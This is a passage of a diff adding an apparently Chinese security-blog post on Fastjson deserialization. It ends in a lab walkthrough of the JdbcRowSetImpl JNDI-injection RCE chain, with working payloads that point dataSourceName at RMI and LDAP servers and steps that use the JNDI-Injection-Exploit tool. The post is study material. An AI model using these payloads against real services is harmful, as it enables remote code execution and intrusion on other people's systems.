class="string">&quot;hello,调用chat方法&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用toStrimg()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, sex=&quot;</span> + sex +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonUnserializationDemo.One;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonDemo</span> &#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 主方法，程序的入口点</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args 命令行参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个User对象，设置name为&quot;zifei&quot;，age为12，gender为1</span></span><br><span class="line">        User user=<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;zifei&quot;</span>,<span class="number">12</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 使用FastJSON库将User对象转换为JSON字符串</span></span><br><span class="line">        String json1= JSON.toJSONString(user);</span><br><span class="line">    <span class="comment">// 打印JSON字符串到控制台</span></span><br><span class="line">        System.out.println(json1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行结果：</p>
+<blockquote>
+<p>调用有参构造<br>getAge<br>getName<br>getSex<br>{“age”:12,”name”:”zifei”,”sex”:1}</p>
+</blockquote>
+<p>原理：</p>
+<blockquote>
+<p>使用JSON.toJSONString(user)将User对象转换为JSON字符串。在这个过程中，Fastjson会通过反射调用User对象的getter方法来获取属性值：<br>调用getName()方法获取name属性，输出”getName”<br>调用getAge()方法获取age属性，输出”getAge”<br>调用getSex()方法获取sex属性，输出”getSex”<br>最终输出的JSON字符串是：{“age”:12,”name”:”zifei”,”sex”:1}<br>这个过程的原理是：<br>Fastjson通过Java的反射机制来访问对象的属性<br>它会自动查找并调用符合JavaBean规范的getter方法（以get开头的方法）来获取属性值<br>然后将这些属性值按照JSON格式序列化成字符串</p>
+</blockquote>
+<h3 id="反序列化-1"><a href="#反序列化-1" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonUnserializationDemo.One;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonDemo</span> &#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 主方法，程序的入口点</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args 命令行参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个User对象，设置name为&quot;zifei&quot;，age为12，gender为1</span></span><br><span class="line">        User user=<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;zifei&quot;</span>,<span class="number">12</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 使用FastJSON库将User对象转换为JSON字符串</span></span><br><span class="line">        String json1= JSON.toJSONString(user);</span><br><span class="line">    <span class="comment">// 打印JSON字符串到控制台</span></span><br><span class="line">        System.out.println(json1);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化操作&quot;</span>);</span><br><span class="line">        <span class="comment">//反序列化操作1</span></span><br><span class="line">        User user1= JSON.parseObject(json1,User.class);</span><br><span class="line">        System.out.println(user1);</span><br><span class="line">        System.out.println(<span class="string">&quot;=====================================================&quot;</span>);</span><br><span class="line">        <span class="comment">//反序列化操作2</span></span><br><span class="line">        JSONObject jsonObject= JSON.parseObject(json1);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">        System.out.println(<span class="string">&quot;=====================================================&quot;</span>);</span><br><span class="line">        <span class="comment">//反序列化操作3</span></span><br><span class="line">        Object  user2= JSON.parse(json1);</span><br><span class="line">        System.out.println(user2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">调用有参构造</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">getSex</span><br><span class="line">&#123;&quot;age&quot;:12,&quot;name&quot;:&quot;zifei&quot;,&quot;sex&quot;:1&#125;</span><br><span class="line">反序列化操作</span><br><span class="line">无参构造</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">setSex</span><br><span class="line">调用toStrimg()</span><br><span class="line">User&#123;name=&#x27;zifei&#x27;, age=12, sex=1&#125;</span><br><span class="line">=====================================================</span><br><span class="line">&#123;&quot;sex&quot;:1,&quot;name&quot;:&quot;zifei&quot;,&quot;age&quot;:12&#125;</span><br><span class="line">=====================================================</span><br><span class="line">&#123;&quot;sex&quot;:1,&quot;name&quot;:&quot;zifei&quot;,&quot;age&quot;:12&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<blockquote>
+<p><code>反序列化操作1: User user1= JSON.parseObject(json1,User.class);</code><br>执行原理：<br>Fastjson首先调用User类的无参构造函数创建一个新的User对象实例，输出”调用无参构造”<br>然后通过反射调用相应的setter方法来设置对象的属性值：<br>调用setName()方法设置name属性，输出”setName”<br>调用setAge()方法设置age属性，输出”setAge”<br>调用setSex()方法设置sex属性，输出”setSex”<br>最后调用toString()方法输出对象信息，输出”调用toStrimg()”<br><code>反序列化操作2: JSONObject jsonObject= JSON.parseObject(json1);</code><br>执行原理：<br>这个操作将JSON字符串解析为JSONObject对象<br>JSONObject是一个键值对集合，类似于Map，它不会创建User对象<br>直接打印JSONObject对象，输出其包含的键值对内容<br><code>反序列化操作3: User user2= JSON.parseObject(jsonObject.toJSONString(), User.class);</code><br>执行原理：<br>首先调用jsonObject.toJSONString()将JSONObject转换回JSON字符串<br>然后和操作1一样，调用User类的无参构造函数创建User对象实例，输出”调用无参构造”<br>通过反射调用setter方法设置属性值：<br>调用setName()方法设置name属性，输出”setName”<br>调用setAge()方法设置age属性，输出”setAge”<br>调用setSex()方法设置sex属性，输出”setSex”<br>最后调用toString()方法输出对象信息，输出”调用toStrimg()”</p>
+</blockquote>
+<h3 id="WriteClassName"><a href="#WriteClassName" class="headerlink" title="WriteClassName"></a>WriteClassName</h3><p>在序列化的代码中添加代码为：</p>
+<p><code>String json1= JSON.toJSONString(user,SerializerFeature.WriteClassName);</code></p>
+<p>然后序列化和饭序序列化的结果为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">调用有参构造</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">getSex</span><br><span class="line">&#123;&quot;@type&quot;:&quot;FastjsonUnserializationDemo.One.User&quot;,&quot;age&quot;:12,&quot;name&quot;:&quot;zifei&quot;,&quot;sex&quot;:1&#125;</span><br><span class="line">反序列化操作</span><br><span class="line">无参构造</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">setSex</span><br><span class="line">调用toStrimg()</span><br><span class="line">User&#123;name=&#x27;zifei&#x27;, age=12, sex=1&#125;</span><br><span class="line">=====================================================</span><br><span class="line">无参构造</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">setSex</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">getSex</span><br><span class="line">&#123;&quot;sex&quot;:1,&quot;name&quot;:&quot;zifei&quot;,&quot;age&quot;:12&#125;</span><br><span class="line">=====================================================</span><br><span class="line">无参构造</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">setSex</span><br><span class="line">调用toStrimg()</span><br><span class="line">User&#123;name=&#x27;zifei&#x27;, age=12, sex=1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析：</p>
+<blockquote>
+<p>添加SerializerFeature.WriteClassName后的输出分析：<br> 序列化过程：<br>当使用JSON.toJSONString(user, SerializerFeature.WriteClassName)时，Fastjson会在生成的JSON字符串中包含对象的类型信息<br>输出的JSON字符串会类似于：{“@type”:”FastjsonUnserializationDemo.One.User”,”age”:12,”name”:”zifei”,”sex”:1}<br>其中”@type”字段包含了完整的类路径信息<br> 反序列化过程分析：<br>反序列化操作1: User user1&#x3D; (User)JSON.parse(json1);<br>使用JSON.parse()方法直接解析包含类名信息的JSON字符串<br>Fastjson根据”@type”字段中的类路径信息自动识别并创建相应类型的对象<br>由于JSON中包含了类型信息，不需要显式指定目标类型，可以直接转换为User对象<br>Fastjson会调用User类的无参构造函数创建实例，输出”调用无参构造”<br>然后通过setter方法设置属性值，输出”setName”、”setAge”、”setSex”<br>最后调用toString()方法输出对象信息，输出”调用toStrimg()”<br>反序列化操作2: JSONObject jsonObject&#x3D; JSON.parseObject(json1);<br>将包含类名信息的JSON字符串解析为JSONObject对象<br>JSONObject会保留”@type”字段和其他属性字段<br>打印JSONObject时会显示完整的键值对，包括类名信息<br>反序列化操作3: User user2&#x3D; JSON.parseObject(jsonObject.toJSONString(), User.class);<br>首先将JSONObject转换为JSON字符串，这个字符串仍然包含”@type”信息<br>然后使用JSON.parseObject()方法将其解析为User对象<br>过程与操作1类似，会调用无参构造函数和setter方法<br>最后输出对象信息<br>WriteClassName特性的意义：<br>自动类型识别：在反序列化时不需要手动指定目标类型，Fastjson会根据”@type”字段自动创建相应类型的对象<br>支持多态：在处理继承关系或接口时特别有用，可以正确还原对象的实际类型<br>安全性考虑：在实际应用中需要注意，恶意构造的”@type”字段可能导致安全问题，因为它会创建任意类的实例<br>这种机制使得Fastjson能够更加智能地处理序列化和反序列化过程，特别是在处理复杂对象结构或多态场景时非常有用。</p>
+</blockquote>
+<blockquote>
+<p>添加后在序列化的时候会保持User类格式，也就是会固定类</p>
+<p>此时反序列化parse会调用set方法</p>
+<p>parseObject会调用get和set方法</p>
+<p>反序列化制定类的时候，会默认调用set方法</p>
+</blockquote>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><blockquote>
+<p>1、序列化固定类后：</p>
+<p>parse方法在调用时会调用set方法</p>
+<p>parseObject在调用时会调用set和get方法</p>
+<p>2、反序列化指定类后：</p>
+<p>parseObject在调用时会调用set方法</p>
+<p>所以fastjson反序列化漏洞利用就是看set和get方法,在追踪链的时候也是</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonUnserializationDemo.One;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonRce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Class.forName(&quot;com.sun.rowset.JdbcRowSetImpl&quot;);</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/cxzyc6\&quot;, &quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析：</p>
+<blockquote>
+<p> System.setProperty(“com.sun.jndi.rmi.object.trustURLCodebase”, “true”);</p>
+<p>这行代码设置了JNDI加载远程代码的信任，允许从远程服务器加载类。在较新的JDK版本中，默认情况下这个属性是false，需要手动设置为true才能加载远程代码。</p>
+</blockquote>
+<p>在这个代码中通过JSON.parse()来反序列化payload字符串，</p>
+<p>在字符串中，</p>
+<blockquote>
+<p>@type：指定要反序列化的类为com.sun.rowset.JdbcRowSetImpl<br>dataSourceName：指定远程RMI服务地址<br>autoCommit：触发JdbcRowSetImpl的setter方</p>
+</blockquote>
+<p>将类的类型通过<code>@type</code>指定反序列化时需要实例化的类com.sun.rowset.JdbcRowSetImpl，并且将值dataSourceName和autoCommit分别赋值。</p>
+<p>JSON.psrse()默认调用set()函数，所以分析setDataSourceName和serAutoCommit函数</p>
+<p><img src="/./images/image-20250912174645209.png" alt="image-20250912174645209"></p>
+<p>搜索datasourceNmae得到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.getDataSourceName().equals(var1)) &#123;</span><br><span class="line">            <span class="built_in">super</span>.setDataSourceName(var1);</span><br><span class="line">            <span class="built_in">this</span>.conn = <span class="literal">null</span>;</span><br><span class="line">            <span class="built_in">this</span>.ps = <span class="literal">null</span>;</span><br><span class="line">            <span class="built_in">this</span>.rs = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.setDataSourceName(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为我们反序列化传入参数getDataSourceName，所以从这个set函数可以得到会调用super.setDataSourceName(var1);</p>
+<p>所以dataSourceName的值变为我们传入的值</p>
+<p>然后搜索autoCommit，得到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为conn我们没有传入值，默认空值，</p>
+<p><img src="/./images/image-20250912174951406.png" alt="image-20250912174951406"></p>
+<p>所以执行<code>this.conn = this.connect();</code></p>
+<p>进入connect()</p>
+<p>可以看到</p>
+<p><img src="/./images/image-20250912175035433.png" alt="image-20250912175035433"></p>
+<p>此处就是漏洞利用点，由于传入了dataSourceName，所以此处执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DataSource var2 = (DataSource)var1.lookup(&quot;传入的值&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>当传入类似rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;cxzyc6，就会触发远程命令执行漏洞。</p>
+<p>可以使用<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit%E5%B7%A5%E5%85%B7%E6%9D%A5%E6%B5%8B%E8%AF%95%E3%80%82%E4%B8%8D%E8%BF%87%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F%E7%9A%84%E8%AF%9D%E5%AF%B9java%E7%AD%89%E7%89%88%E6%9C%AC%E6%9C%89%E8%A6%81%E6%B1%82">https://github.com/welk1n/JNDI-Injection-Exploit工具来测试。不过利用成功的话对java等版本有要求</a></p>
+<h3 id="利用链总结"><a href="#利用链总结" class="headerlink" title="利用链总结"></a>利用链总结</h3><p>com.sun.rowset.JdbcRowSetImpl类存在以下特点：</p>
+<ul>
+<li>当调用setDataSourceName()方法时，会设置数据源名称</li>
+<li>当调用setAutoCommit()方法时，如果连接为空，会尝试建立连接</li>
+<li>在建立连接时，会使用JNDI查找dataSourceName指定的远程对象</li>
+<li>如果dataSourceName指向恶意RMI服务器，攻击者就可以让目标服务器加载并执行远程的恶意代码</li>
+</ul>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><blockquote>
+<p>攻击者设置恶意RMI服务器（如：rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;cxzyc6）<br>目标应用使用Fastjson解析包含恶意@type的JSON<br>Fastjson实例化JdbcRowSetImpl对象并调用setter方法<br>JdbcRowSetImpl通过JNDI连接到恶意RMI服务器<br>RMI服务器返回恶意类并执行，实现远程代码执行</p>
+</blockquote>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><p>可以使用ldap协议</p>
+<p>在<a target="_blank" rel="noopener" href="http://www.dnslog.cn/%E7%BD%91%E7%AB%99%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%EF%BC%8C">http://www.dnslog.cn/网站得到一个域名，</a></p>
+<p><img src="/./images/image-20250912180635067.png" alt="image-20250912180635067"></p>
+<p>然后运行，这样不能测试RCE，但也可以看到访问</p>
+<p><img src="/./images/image-20250912180713276.png" alt="image-20250912180713276"></p>
+<h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><p>修改代码为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonUnserializationDemo.One;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonRce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 设置JNDI信任远程codebase</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://10.56.93.60:1389/dyhorb\&quot;, &quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JSON.parse(payload);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;发生异常，但这在测试中是预期的: &quot;</span> + e.getMessage());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后使用<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a>工具，</p>
+<p>配置工具<img src="/./images/image-20250912181638200.png" alt="image-20250912181638200"></p>
+<p>运行后，再运行有漏洞的代码，可以看到成功弹出计算器。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="子非鱼 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="子非鱼 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" rel="tag"># Java安全开发</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/01/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/Java/Java%E7%B4%AF%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" rel="prev" title="Java累类加载机制">
+                  <i class="fa fa-angle-left"></i> Java累类加载机制
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">子非鱼</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
